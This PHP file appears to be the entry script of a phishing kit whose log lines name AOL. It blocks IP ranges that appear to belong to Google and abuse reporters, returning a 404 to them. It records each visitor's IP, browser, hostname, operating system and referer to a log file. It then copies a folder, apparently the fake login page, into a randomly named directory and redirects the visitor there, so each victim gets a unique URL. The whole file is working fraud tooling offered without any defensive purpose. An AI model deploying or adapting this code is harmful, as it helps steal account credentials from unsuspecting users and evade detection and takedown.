<?php

// array's of banned IP addresses
$bannedIP = array("^66.102.*.*", "^66.249.*.*", "^72.14.192.*", "^109.67.197.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     // this is for exact matches of IP address in array
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     // this is for wild card matches
     foreach($bannedIP as $ip) {
          if(eregi($ip,$_SERVER['REMOTE_ADDR'])) {
               header('HTTP/1.0 404 Not Found');
               exit();
          }
     }
}

?>
<?
require_once 'block.php';
?>
<?
/*
* index.php
* 
* Logging user info then redirect to login page , with unique url each time
*/

//Block bots (Reporters)
require_once 's/block.php';


//Call Log Files
require_once 'log/os.php'; // Determine User Operating System info
require_once 'log/browser.php'; // Determine User Browser
require_once 'log/log.php'; // Logging class


// Get User Agent Info (IP, ISP, Browser info.etc)
$IP = "IP Adress: " .getenv("REMOTE_ADDR"); // Get user IP
$Agent = "User Agent: " .$_SERVER['HTTP_USER_AGENT']; //Get User Agent
$browserType = "Browser: "  .getBrowser($_SERVER['HTTP_USER_AGENT']);
$hostname = "Hostname: " .gethostbyaddr($_SERVER['REMOTE_ADDR']); //Get User Hostname
$OS = "Operating System: " .getOS($_SERVER['HTTP_USER_AGENT']); //Get User Operating System
$Referer = "Referer: " .$_SERVER['HTTP_REFERER']; //Get User Referer



// Logging class initialization
$log = new Logging();

// set path and name of log file (optional)
$log->lfile('log/logs.txt');
 
// write message to the log file
$log->lwrite('=============================Begin of Log AOL '.$IP.' ============================');
$log->lwrite($IP);
$log->lwrite($Agent);
$log->lwrite($browserType);
$log->lwrite($hostname);
$log->lwrite($OS);
$log->lwrite($Referer);
$log->lwrite('=============================End of Log AOL '.$IP.' ============================');
$log->lwrite("\n \n");

// close log file
$log->lclose();



//Create Random Folder

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="s";
recurse_copy( $src, $dst );
header("location:$dst");



?>
